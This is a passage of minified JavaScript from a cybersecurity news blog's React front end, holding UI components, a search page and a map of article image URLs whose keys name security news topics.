s=i.map(a=>{const c=Yf(a,t);return!r&&typeof c=="function"&&(r=!0),c});if(r)return()=>{for(let a=0;a<s.length;a++){const c=s[a];typeof c=="function"?c():Yf(i[a],null)}}}}function hi(...i){return S.useCallback(ly(...i),i)}function Yo(i){const t=x2(i),r=S.forwardRef((s,a)=>{const{children:c,...d}=s,h=S.Children.toArray(c),p=h.find(S2);if(p){const f=p.props.children,m=h.map(y=>y===p?S.Children.count(f)>1?S.Children.only(null):S.isValidElement(f)?f.props.children:null:y);return x.jsx(t,{...d,ref:a,children:S.isValidElement(f)?S.cloneElement(f,void 0,m):null})}return x.jsx(t,{...d,ref:a,children:c})});return r.displayName=`${i}.Slot`,r}var k2=Yo("Slot");function x2(i){const t=S.forwardRef((r,s)=>{const{children:a,...c}=r;if(S.isValidElement(a)){const d=C2(a),h=A2(c,a.props);return a.type!==S.Fragment&&(h.ref=s?ly(s,d):d),S.cloneElement(a,h)}return S.Children.count(a)>1?S.Children.only(null):null});return t.displayName=`${i}.SlotClone`,t}var T2=Symbol("radix.slottable");function S2(i){return S.isValidElement(i)&&typeof i.type=="function"&&"__radixId"in i.type&&i.type.__radixId===T2}function A2(i,t){const r={...t};for(const s in t){const a=i[s],c=t[s];/^on[A-Z]/.test(s)?a&&c?r[s]=(...h)=>{const p=c(...h);return a(...h),p}:a&&(r[s]=a):s==="style"?r[s]={...a,...c}:s==="className"&&(r[s]=[a,c].filter(Boolean).join(" "))}return{...i,...r}}function C2(i){let t=Object.getOwnPropertyDescriptor(i.props,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning;return r?i.ref:(t=Object.getOwnPropertyDescriptor(i,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning,r?i.props.ref:i.props.ref||i.ref)}const Xf=i=>typeof i=="boolean"?`${i}`:i===0?"0":i,Zf=Pd,cy=(i,t)=>r=>{var s;if(t?.variants==null)return Zf(i,r?.class,r?.className);const{variants:a,defaultVariants:c}=t,d=Object.keys(a).map(f=>{const m=r?.[f],y=c?.[f];if(m===null)return null;const v=Xf(m)||Xf(y);return a[f][v]}),h=r&&Object.entries(r).reduce((f,m)=>{let[y,v]=m;return v===void 0||(f[y]=v),f},{}),p=t==null||(s=t.compoundVariants)===null||s===void 0?void 0:s.reduce((f,m)=>{let{class:y,className:v,...w}=m;return Object.entries(w).every(P=>{let[T,C]=P;return Array.isArray(C)?C.includes({...c,...h}[T]):{...c,...h}[T]===C})?[...f,y,v]:f},[]);return Zf(i,d,p,r?.class,r?.className)},E2=cy("inline-flex items-center justify-center rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),Ht=Ee.forwardRef(({className:i,variant:t,size:r,asChild:s=!1,...a},c)=>{const d=s?k2:"button";return x.jsx(d,{className:yt(E2({variant:t,size:r,className:i})),ref:c,...a})});Ht.displayName="Button";const Xo={default:"https://images.unsplash.com/photo-1549287540-b5e39fc85fa1",zeroDayThreat:"https://ethicalbyte.in/blogs/img/1.webp",phishingConcept:"https://ethicalbyte.in/blogs/img/2.webp",passwordSecurity:"https://ethicalbyte.in/blogs/img/3.webp",vpnConcept:"https://ethicalbyte.in/blogs/img/4.webp",ransomwareLock:"https://ethicalbyte.in/blogs/img/5.webp",iotNetwork:"https://ethicalbyte.in/blogs/img/6.webp",aiCyberThreat:"https://ethicalbyte.in/blogs/img/7.webp",linuxKernelBreach:"https://ethicalbyte.in/blogs/img/8.webp",socialThreats:"https://ethicalbyte.in/blogs/img/9.webp",apt29GmailAttack:"https://ethicalbyte.in/blogs/img/10.webp",passwordLeak16B:"https://ethicalbyte.in/blogs/img/11.webp",gmailPasskeyUpgrade:"https://ethicalbyte.in/blogs/img/12.webp",iranTvHijack:"https://ethicalbyte.in/blogs/img/13.webp",smishingAlert:"https://ethicalbyte.in/blogs/img/14.webp",weeklyCyberRecap:"https://ethicalbyte.in/blogs/img/15.webp",deleteHarmfulApps:"https://ethicalbyte.in/blogs/img/16.webp",chromeZeroDayExploit:"https://ethicalbyte.in/blogs/img/17.webp",fileUploadPhishing:"https://ethicalbyte.in/blogs/img/18.webp",scatteredSpiderAirline:"https://ethicalbyte.in/blogs/img/19.webp",chromeFirefoxUpdate:"https://ethicalbyte.in/blogs/img/20.webp",northKoreaZoomMalware:"https://ethicalbyte.in/blogs/img/21.webp",googleDataVerdict:"https://ethicalbyte.in/blogs/img/22.webp",taiwanChineseApps:"https://ethicalbyte.in/blogs/img/23.webp",catwatchfulSpyware:"https://ethicalbyte.in/blogs/img/24.webp",vishingQantas:"https://ethicalbyte.in/blogs/img/25.webp",euProtectEU:"https://ethicalbyte.in/blogs/img/26.webp",ingramMicroRansomware:"https://ethicalbyte.in/blogs/img/27.webp",maliciousEsDomains:"https://ethicalbyte.in/blogs/img/28.webp",perfektBlueCarHack:"https://ethicalbyte.in/blogs/img/29.webp",cyberTalk2025Banner:"https://ethicalbyte.in/blogs/img/30.webp",deepfakeThreatBanner:"https://ethicalbyte.in/blogs/img/31.webp",nipponSteelBreachBanner:"https://ethicalbyte.in/blogs/img/32.webp",ntroPhishingBanner:"https://ethicalbyte.in/blogs/img/33.webp",evChargingVulnBanner:"https://ethicalbyte.in/blogs/img/34.webp",jackMessagingAppBanner:"https://ethicalbyte.in/blogs/img/35.webp",louisVuittonBreachBanner:"https://ethicalbyte.in/blogs/img/36.webp",oracleJuly2025PatchBanner:"https://ethicalbyte.in/blogs/img/37.webp",bciCybersecurityBanner:"https://ethicalbyte.in/blogs/img/38.webp",mcdonaldsAIHiringBreachBanner:"https://ethicalbyte.in/blogs/img/39.webp",blockchainThreatIntelBanner:"https://ethicalbyte.in/blogs/img/40.webp",tiktokEUPrivacyBanner:"https://ethicalbyte.in/blogs/img/41.webp",massistantSurveillanceBanner:"https://ethicalbyte.in/blogs/img/42.webp",apt41AfricaSharePointBanner:"https://ethicalbyte.in/blogs/img/43.webp",coindcxBreachBanner:"https://ethicalbyte.in/blogs/img/44.webp",staccAttackBanner:"https://ethicalbyte.in/blogs/img/45.webp",usbCableHackingBanner:"https://ethicalbyte.in/blogs/img/46.webp",laughingMantisBanner:"https://ethicalbyte.in/blogs/img/47.webp",allianzBreachBanner:"https://ethicalbyte.in/blogs/img/48.webp",cargoTalonBanner:"https://ethicalbyte.in/blogs/img/49.webp",vastavAIDeepfakeBanner:"https://ethicalbyte.in/blogs/img/50.webp",quantumBitcoinBanner:"https://ethicalbyte.in/blogs/img/51.webp",nigeriaAICybersecurityBanner:"https://ethicalbyte.in/blogs/img/52.webp",microsoftOauthTycoonAttack:"https://ethicalbyte.in/blogs/img/53.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/54.webp",nvidiaTritonExploit:"https://ethicalbyte.in/blogs/img/55.webp",generativeAICyberBanner:"https://ethicalbyte.in/blogs/img/56.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/57.webp",geminicalendarexploitbanner:"https://ethicalbyte.in/blogs/img/58.webp",lenovobadcamexploitbanner:"https://ethicalbyte.in/blogs/img/59.webp",malwareTop5:"https://ethicalbyte.in/blogs/img/60.webp",shinyspider2025:"https://ethicalbyte.in/blogs/img/61.webp",aimlinnovations2025:"https://ethicalbyte.in/blogs/img/62.webp",aideepfakecyberattacks:"https://ethicalbyte.in/blogs/img/63.webp",ermacTrojanLeak:"https://ethicalbyte.in/blogs/img/64.webp",gmailPhishVoicemailBanner:"https://ethicalbyte.in/blogs/img/65.webp",rapperbotDdosBanner:"https://ethicalbyte.in/blogs/img/66.webp",aiBrowserPromptFix2025:"https://ethicalbyte.in/blogs/img/67.webp",quirkyloadermalware2025:"https://ethicalbyte.in/blogs/img/68.webp",operationSerengetiBanner:"https://ethicalbyte.in/blogs/img/69.webp",linuxFilenameMalwareBanner:"https://ethicalbyte.in/blogs/img/70.webp",upcrypterPhishingBanner:"https://ethicalbyte.in/blogs/img/71.webp",storm0501CloudTakeoverBanner:"https://ethicalbyte.in/blogs/img/72.webp",tamperedchefMalwareBanner:"https://ethicalbyte.in/blogs/img/73.webp",velociraptorAbuseBanner:"https://ethicalbyte.in/blogs/img/74.webp",zscalerSalesloftBreachBanner:"https://ethicalbyte.in/blogs/img/75.webp",mystrodxBackdoorBanner:"https://ethicalbyte.in/blogs/img/76.webp",hexstrikeAiWeaponizedBanner:"https://ethicalbyte.in/blogs/img/77.webp",genaiChatGPTLeakBanner:"https://ethicalbyte.in/blogs/img/78.webp",castleRATBanner:"https://ethicalbyte.in/blogs/img/79.webp",barrelFireBanner:"https://ethicalbyte.in/blogs/img/80.webp",fakeHireBanner:"https://ethicalbyte.in/blogs/img/81.webp",pixel10C2PABanner:"https://ethicalbyte.in/blogs/img/82.webp",hybridPetyaBanner:"https://ethicalbyte.in/blogs/img/83.webp",fbiSalesforceBreach:"https://ethicalbyte.in/blogs/img/84.webp",browserAttacks2025Banner:"https://ethicalbyte.in/blogs/img/85.webp",aiAgentControlBanner:"https://ethicalbyte.in/blogs/img/86.webp",venomHotelBanner:"https://ethicalbyte.in/blogs/img/87.webp",aiQuantumCyberBanner:"https://ethicalbyte.in/blogs/img/88.webp",sapSovereignCloudIndia:"https://ethicalbyte.in/blogs/img/89.webp",autonomousAICyberBanner:"https://ethicalbyte.in/blogs/img/90.webp",europeCryptoScam2025:"https://ethicalbyte.in/blogs/img/91.webp",brickstormBackdoorBanner:"https://ethicalbyte.in/blogs/img/92.webp",oneplusSMSVuln:"https://ethicalbyte.in/blogs/img/93.webp",evilaiMalwareBanner:"https://ethicalbyte.in/blogs/img/94.webp",ukBitcoinBust:"https://ethicalbyte.in/blogs/img/95.webp",ukAppleBackdoorBanner:"https://ethicalbyte.in/blogs/img/96.webp",cometJackingBanner:"https://ethicalbyte.in/blogs/img/97.webp",oracleEBSZeroDayBanner:"https://ethicalbyte.in/blogs/img/98.webp",weeklyRecapBannerOct2025:"https://ethicalbyte.in/blogs/img/99.webp",gh0stRat100thBlogBanner:"https://ethicalbyte.in/blogs/img/100.webp"},dy=({post:i})=>{const{theme:t}=Vn(),r={hidden:{opacity:0,y:20},visible:{opacity:1,y:0},hover:{scale:1.02,boxShadow:t==="dark"?"0px 10px 20px hsla(var(--primary), 0.25)":"0px 8px 25px rgba(0, 0, 0, 0.08)"}},s=t==="dark"?"bg-card border-border hover:border-primary/60":"bg-card border-border hover:border-primary/40",a=t==="dark"?"text-primary hover:text-primary/80":"text-foreground hover:text-primary",c=t==="dark"?"text-slate-400":"text-muted-foreground",d=t==="dark"?"text-slate-300":"text-foreground/80",h=t==="dark"?"text-accent hover:text-accent/80":"text-primary hover:text-primary/80",p=Xo[i.imageKey]||Xo.default,f=`#/post/${i.id}`;return x.jsx(et.div,{variants:r,whileHover:"hover",className:"h-full group",children:x.jsxs(ny,{className:`flex flex-col h-full ${s} transition-all duration-300 shadow-md hover:shadow-xl rounded-xl overflow-hidden`,children:[x.jsxs(iy,{className:"p-0",children:[x.jsx("div",{className:"mb-4 h-48 w-full overflow-hidden",children:x.jsx("a",{href:f,"aria-label":`Read more about ${i.title}`,children:x.jsx("img",{className:"w-full h-full object-cover transition-transform duration-300 group-hover:scale-105",alt:`Blog post illustration for ${i.title}`,src:p})})}),x.jsxs("div",{className:"p-6",children:[x.jsx(ry,{className:`text-xl font-semibold ${a} transition-colors`,children:x.jsx("a",{href:f,children:i.title})}),x.jsxs(sy,{className:`${c} text-xs flex flex-wrap items-center gap-x-3 gap-y-1 mt-2`,children:[x.jsxs("span",{className:"flex items-center",children:[x.jsx(Tg,{size:14,className:"mr-1"})," ",i.date]}),x.jsxs("span",{className:"flex items-center",children:[x.jsx(Ag,{size:14,className:"mr-1"})," ",i.author]})]})]})]}),x.jsx(oy,{className:"flex-grow px-6 pb-4",children:x.jsx("p",{className:`${d} leading-relaxed text-sm`,children:i.summary})}),x.jsx(ay,{className:"px-6 pb-6",children:x.jsx(Ht,{asChild:!0,variant:"link",className:`${h} p-0 text-sm`,children:x.jsxs("a",{href:f,className:"flex items-center font-semibold",children:["Read More ",x.jsx(xg,{size:16,className:"ml-1"})]})})})]})})};function P2(...i){return ty(Pd(i))}const aa=Ee.forwardRef(({className:i,type:t,...r},s)=>x.jsx("input",{type:t,className:P2("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",i),ref:s,...r}));aa.displayName="Input";const Tc=6,I2=({searchTerm:i,setSearchTerm:t})=>{const{theme:r}=Vn(),[s,a]=S.useState([]),c=S.useMemo(()=>[...Ed].sort((C,L)=>new Date(L.date)-new Date(C.date)),[]),d=S.useMemo(()=>i?c.filter(C=>C.title.toLowerCase().includes(i.toLowerCase())||C.summary.toLowerCase().includes(i.toLowerCase())||C.tags&&C.tags.some(L=>L.toLowerCase().includes(i.toLowerCase()))):c.slice(0,Tc),[i,c]);S.useEffect(()=>{a(i?d:c.slice(0,Tc))},[i,c,d]);const h=S.useCallback(C=>{t(C.target.value)},[t]),p=S.useCallback(()=>{t("")},[t]),f={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},m=r==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",y=r==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",v=r==="dark"?"text-slate-400":"text-muted-foreground",w=r==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",P=r==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return x.jsxs("div",{className:"space-y-12",children:[x.jsxs(et.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${m} rounded-xl shadow-lg p-8`,children:[x.jsx("h1",{className:`text-5xl md:text-6xl font-bold mb-6 ${y}`,children:"CyberSec Insights"}),x.jsx("p",{className:`text-lg md:text-xl ${v} max-w-3xl mx-auto mb-10`,children:"Your trusted source for the latest in cybersecurity news, threats, and best practices. Stay informed, stay secure."}),x.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[x.jsx(Sg,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${P} transition-colors`}),x.jsx(aa,{type:"search",placeholder:"Search recent articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${w}`,value:i,onChange:h}),i&&x.jsx("button",{onClick:p,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:x.jsx(Uo,{size:20})})]})]}),i&&s.length>0&&x.jsxs(et.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[x.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",x.jsx("span",{className:"text-primary",children:i})]}),x.jsxs("p",{className:"text-muted-foreground",children:[s.length," post(s) found."]})]}),s.length===0&&x.jsxs(et.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[x.jsx(Uo,{size:48,className:"mx-auto text-destructive mb-4"}),x.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),x.jsx("p",{className:"text-muted-foreground",children:i?`Sorry, we couldn't find any articles matching "${i}". Try a different search term or view all posts.`:"There are no recent articles available. Check back soon!"})]}),s.length>0&&x.jsx(et.section,{variants:f,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:s.map(C=>x.jsx(dy,{post:C},C.id))}),!i&&c.length>Tc&&x.jsx(et.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:.3},className:"text-center mt-12",children:x.jsx(Ht,{asChild:!0,size:"lg",className:"bg-primary hover:bg-primary/90 text-primary-foreground shadow-md hover:shadow-lg transition-all",children:x.jsxs("a",{href:"#/all-blogs",children:["View All Posts ",x.jsx(xg,{size:20,className:"ml-2"})]})})})]})},uy=()=>{const{theme:i}=Vn(),t=i==="dark"?"text-amber-400":"text-amber-500",r=i==="dark"?"text-red-400":"text-red-500",s=i==="dark"?"text-slate-300":"text-foreground/90",a=i==="dark"?"text-slate-400":"text-muted-foreground",c=i==="dark"?"text-background bg-sky-400 hover:bg-sky-500 hover:shadow-sky-500/50":"text-primary-foreground bg-primary hover:bg-primary/90 hover:shadow-primary/30";return x.jsxs(et.div,{initial:{opacity:0,scale:.9},animate:{opacity:1,scale:1},transition:{duration:.5},className:"flex flex-col items-center justify-center min-h-[70vh] text-center p-6",children:[x.jsx(et.div,{initial:{y:-20,opacity:0},animate:{y:0,opacity:1},transition:{delay:.2,type:"spring",stiffness:120},children:x.jsx(dw,{className:`mx-auto h-24 w-24 ${t} mb-6`})}),x.jsx("h1",{className:`text-6xl font-extrabold ${r} mb-4`,children:"404"}),x.jsx("h2",{className:`text-3xl font-semibold ${s} mb-6`,children:"Content Not Found"}),x.jsx("p",{className:`text-lg ${a} max-w-md mx-auto mb-8`,children:"Oops! The content you're looking for at this URL path doesn't exist. It might have been moved or the link is incorrect."}),x.jsxs("a",{href:"#/",className:`inline-flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md ${c} transition-all shadow-lg`,children:[x.jsx(yw,{size:20,className:"mr-2"}),"Go Back Home"]})]})},hy=Ee.forwardRef(({className:i,...t},r)=>x.jsx("textarea",{className:yt("flex min-h-[80px] w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",i),ref:r,...t}));hy.displayName="Textarea";var _d=wg();const _2=id(_d);function Tt(i,t,{checkForDefaultPrevented:r=!0}={}){return function(a){if(i?.(a),r===!1||!a.defaultPrevented)return t?.(a)}}function py(i,t=[]){let r=[];function s(c,d){const h=S.createContext(d),p=r.length;r=[...r,d];const f=y=>{const{scope:v,children:w,...P}=y,T=v?.[i]?.[p]||h,C=S.useMemo(()=>P,Object.values(P));return x.jsx(T.Provider,{value:C,children:w})};f.displayName=c+"Provider";function m(y,v){const w=v?.[i]?.[p]||h,P=S.useContext(w);if(P)return P;if(d!==void 0)return d;throw new Error(`\`${y}\` must be used within \`${c}\``)}return[f,m]}const a=()=>{const c=r.map(d=>S.createContext(d));return function(h){const p=h?.[i]||c;return S.useMemo(()=>({[`__scope${i}`]:{...h,[i]:p}}),[h,p])}};return a.scopeName=i,[s,R2(a,...t)]}function R2(...i){const t=i[0];if(i.length===1)return t;const r=()=>{const s=i.map(a=>({useScope:a(),scopeName:a.scopeName}));return function(c){const d=s.reduce((h,{useScope:p,scopeName:f})=>{const y=p(c)[`__scope${f}`];return{...h,...y}},{});return S.useMemo(()=>({[`__scope${t.scopeName}`]:d}),[d])}};return r.scopeName=t.scopeName,r}function D2(i){const t=i+"CollectionProvider",[r,s]=py(t),[a,c]=r(t,{collectionRef:{current:null},itemMap:new Map}),d=T=>{const{scope:C,children:L}=T,R=Ee.useRef(null),M=Ee.useRef(new Map).current;return x.jsx(a,{scope:C,itemMap:M,collectionRef:R,children:L})};d.displayName=t;const h=i+"CollectionSlot",p=Yo(h),f=Ee.forwardRef((T,C)=>{const{scope:L,children:R}=T,M=c(h,L),O=hi(C,M.collectionRef);return x.jsx(p,{ref:O,children:R})});f.displayName=h;const m=i+"CollectionItemSlot",y="data-radix-collection-item",v=Yo(m),w=Ee.forwardRef((T,C)=>{const{scope:L,children:R,...M}=T,O=Ee.useRef(null),W=hi(C,O),J=c(m,L);return Ee.useEffect(()=>(J.itemMap.set(O,{ref:O,...M}),()=>void J.itemMap.delete(O))),x.jsx(v,{[y]:"",ref:W,children:R})});w.displayName=m;function P(T){const C=c(i+"CollectionConsumer",T);return Ee.useCallback(()=>{const R=C.collectionRef.current;if(!R)return[];const M=Array.from(R.querySelectorAll(`[${y}]`));return Array.from(C.itemMap.values()).sort((J,G)=>M.indexOf(J.ref.current)-M.indexOf(G.ref.current))},[C.collectionRef,C.itemMap])}return[{Provider:d,Slot:f,ItemSlot:w},P,s]}var M2=["a","button","div","form","h2","h3","img","input","label","li","nav","ol","p","select","span","svg","ul"],Xt=M2.reduce((i,t)=>{const r=Yo(`Primitive.${t}`),s=S.forwardRef((a,c)=>{const{asChild:d,...h}=a,p=d?r:t;return typeof window<"u"&&(window[Symbol.for("radix-ui")]=!0),x.jsx(p,{...h,ref:c})});return s.displayName=`Primitive.${t}`,{...i,[t]:s}},{});function fy(i,t){i&&_d.flushSync(()=>i.dispatchEvent(t))}function pi(i){const t=S.useRef(i);return S.useEffect(()=>{t.current=i}),S.useMemo(()=>(...r)=>t.current?.(...r),[])}function j2(i,t=globalThis?.document){const r=pi(i);S.useEffect(()=>{const s=a=>{a.key==="Escape"&&r(a)};return t.addEventListener("keydown",s,{capture:!0}),()=>t.removeEventListener("keydown",s,{capture:!0})},[r,t])}var O2="DismissableLayer",Jc="dismissableLayer.update",L2="dismissableLayer.pointerDownOutside",B2="dismissableLayer.focusOutside",eg,gy=S.createContext({layers:new Set,layersWithOutsidePointerEventsDisabled:new Set,branches:new Set}),my=S.forwardRef((i,t)=>{const{disableOutsidePointerEvents:r=!1,onEscapeKeyDown:s,onPointerDownOutside:a,onFocusOutside:c,onInteractOutside:d,onDismiss:h,...p}=i,f=S.useContext(gy),[m,y]=S.useState(null),v=m?.ownerDocument??globalThis?.document,[,w]=S.useState({}),P=hi(t,G=>y(G)),T=Array.from(f.layers),[C]=[...f.layersWithOutsidePointerEventsDisabled].slice(-1),L=T.indexOf(C),R=m?T.indexOf(m):-1,M=f.layersWithOutsidePointerEventsDisabled.size>0,O=R>=L,W=F2(G=>{const X=G.target,ie=[...f.branches].some(ge=>ge.contains(X));!O||ie||(a?.(G),d?.(G),G.defaultPrevented||h?.())},v),J=z2(G=>{const X=G.target;[...f.branches].some(ge=>ge.contains(X))||(c?.(G),d?.(G),G.defaultPrevented||h?.())},v);return j2(G=>{R===f.layers.size-1&&(s?.(G),!G.defaultPrevented&&h&&(G.preventDefault(),h()))},v),S.useEffect(()=>{if(m)return r&&(f.layersWithOutsidePointerEventsDisabled.size===0&&(eg=v.body.style.pointerEvents,v.body.style.pointerEvents="none"),f.layersWithOutsidePointerEventsDisabled.add(m)),f.layers.add(m),tg(),()=>{r&&f.layersWithOutsidePointerEventsDisabled.size===1&&(v.body.style.pointerEvents=eg)}},[m,v,r,f]),S.useEffect(()=>()=>{m&&(f.layers.delete(m),f.layersWithOutsidePointerEventsDisabled.delete(m),tg())},[m,f]),S.useEffect(()=>{const G=()=>w({});return document.addEventListener(Jc,G),()=>document.removeEventListener(Jc,G)},[]),x.jsx(Xt.div,{...p,ref:P,style:{pointerEvents:M?O?"auto":"none":void 0,...i.style},onFocusCapture:Tt(i.onFocusCapture,J.onFocusCapture),onBlurCapture:Tt(i.onBlurCapture,J.onBlurCapture),onPointerDownCapture:Tt(i.onPointerDownCapture,W.onPointerDownCapture)})});my.displayName=O2;var N2="DismissableLayerBranch",yy=S.forwardRef((i,t)=>{const r=S.useContext(gy),s=S.useRef(null),a=hi(t,s);return S.useEffect(()=>{const c=s.current;if(c)return r.branches.add(c),()=>{r.branches.delete(c)}},[r.branches]),x.jsx(Xt.div,{...i,ref:a})});yy.displayName=N2;function F2(i,t=globalThis?.document){const r=pi(i),s=S.useRef(!1),a=S.useRef(()=>{});return S.useEffect(()=>{const c=h=>{if(h.target&&!s.current){let p=function(){by(L2,r,f,{discrete:!0})};const f={originalEvent:h};h.pointerType==="touch"?(t.removeEventListener("click",a.current),a.current=p,t.addEventListener("click",a.current,{once:!0})):p()}else t.removeEventListener("click",a.current);s.current=!1},d=window.setTimeout(()=>{t.addEventListener("pointerdown",c)},0);return()=>{window.clearTimeout(d),t.removeEventListener("pointerdown",c),t.removeEventListener("click",a.current)}},[t,r]),{onPointerDownCapture:()=>s.current=!0}}function z2(i,t=globalThis?.document){const r=pi(i),s=S.useRef(!1);return S.useEffect(()=>{const a=c=>{c.target&&!s.current&&by(B2,r,{originalEvent:c},{discrete:!1})};return t.addEventListener("focusin",a),()=>t.removeEventListener("focusin",a)},[t,r]),{onFocusCapture:()=>s.current=!0,onBlurCapture:()=>s.current=!1}}function tg(){const i=new CustomEvent(Jc);document.dispatchEvent(i)}function by(i,t,r,{discrete:s}){const a=r.originalEvent.target,c=new CustomEvent(i,{bubbles:!1,cancelable:!0,detail:r});t&&a.addEventListener(i,t,{once:!0}),s?fy(a,c):a.dispatchEvent(c)}var V2=my,U2=yy,cs=globalThis?.document?S.useLayoutEffect:()=>{},W2="Portal",vy=S.forwardRef((i,t)=>{const{container:r,...s}=i,[a,c]=S.useState(!1);cs(()=>c(!0),[]);const d=r||a&&globalThis?.document?.body;return d?_2.createPortal(x.jsx(Xt.div,{...s,ref:t}),d):null});vy.displayName=W2;function $2(i,t){return S.useReducer((r,s)=>t[r][s]??r,i)}var wy=i=>{const{present:t,children:r}=i,s=H2(t),a=typeof r=="function"?r({present:s.isPresent}):S.Children.only(r),c=hi(s.ref,G2(a));return typeof r=="function"||s.isPresent?S.cloneElement(a,{ref:c}):null};wy.displayName="Presence";function H2(i){const[t,r]=S.useState(),s=S.useRef(null),a=S.useRef(i),c=S.useRef("none"),d=i?"mounted":"unmounted",[h,p]=$2(d,{mounted:{UNMOUNT:"unmounted",ANIMATION_OUT:"unmountSuspended"},unmountSuspended:{MOUNT:"mounted",ANIMATION_END:"unmounted"},unmounted:{MOUNT:"mounted"}});return S.useEffect(()=>{const f=Mo(s.current);c.current=h==="mounted"?f:"none"},[h]),cs(()=>{const f=s.current,m=a.current;if(m!==i){const v=c.current,w=Mo(f);i?p("MOUNT"):w==="none"||f?.display==="none"?p("UNMOUNT"):p(m&&v!==w?"ANIMATION_OUT":"UNMOUNT"),a.current=i}},[i,p]),cs(()=>{if(t){let f;const m=t.ownerDocument.defaultView??window,y=w=>{const T=Mo(s.current).includes(w.animationName);if(w.target===t&&T&&(p("ANIMATION_END"),!a.current)){const C=t.style.animationFillMode;t.style.animationFillMode="forwards",f=m.setTimeout(()=>{t.style.animationFillMode==="forwards"&&(t.style.animationFillMode=C)})}},v=w=>{w.target===t&&(c.current=Mo(s.current))};return t.addEventListener("animationstart",v),t.addEventListener("animationcancel",y),t.addEventListener("animationend",y),()=>{m.clearTimeout(f),t.removeEventListener("animationstart",v),t.removeEventListener("animationcancel",y),t.removeEventListener("animationend",y)}}else p("ANIMATION_END")},[t,p]),{isPresent:["mounted","unmountSuspended"].includes(h),ref:S.useCallback(f=>{s.current=f?getComputedStyle(f):null,r(f)},[])}}function Mo(i){return i?.animationName||"none"}function G2(i){let t=Object.getOwnPropertyDescriptor(i.props,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning;return r?i.ref:(t=Object.getOwnPropertyDescriptor(i,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning,r?i.props.ref:i.props.ref||i.ref)}var q2=tw[" useInsertionEffect ".trim().toString()]||cs;function K2({prop:i,defaultProp:t,onChange:r=()=>{},caller:s}){const[a,c,d]=J2({defaultProp:t,onChange:r}),h=i!==void 0,p=h?i:a;{const m=S.useRef(i!==void 0);S.useEffect(()=>{const y=m.current;y!==h&&console.warn(`${s} is changing from ${y?"controlled":"uncontrolled"} to ${h?"controlled":"uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`),m.current=h},[h,s])}const f=S.useCallback(m=>{if(h){const y=Q2(m)?m(i):m;y!==i&&d.current?.(y)}else c(m)},[h,i,c,d]);return[p,f]}function J2({defaultProp:i,onChange:t}){const[r,s]=S.useState(i),a=S.useRef(r),c=S.useRef(t);return q2(()=>{c.current=t},[t]),S.useEffect(()=>{a.current!==r&&(c.current?.(r),a.current=r)},[r,a]),[r,s,c]}function Q2(i){return typeof i=="function"}var Y2=Object.freeze({position:"absolute",border:0,width:1,height:1,padding:0,margin:-1,overflow:"hidden",clip:"rect(0, 0, 0, 0)",whiteSpace:"nowrap",wordWrap:"normal"}),X2="VisuallyHidden",Rd=S.forwardRef((i,t)=>x.jsx(Xt.span,{...i,ref:t,style:{...Y2,...i.style}}));Rd.displayName=X2;var Dd="ToastProvider",[Md,Z2,eT]=D2("Toast"),[ky,b3]=py("Toast",[eT]),[tT,la]=ky(Dd),xy=i=>{const{__scopeToast:t,label:r="Notification",duration:s=5e3,swipeDirection:a="right",swipeThreshold:c=50,children:d}=i,[h,p]=S.useState(null),[f,m]=S.useState(0),y=S.useRef(!1),v=S.useRef(!1);return r.trim()||console.error(`Invalid prop \`label\` supplied to \`${Dd}\`. Expected non-empty 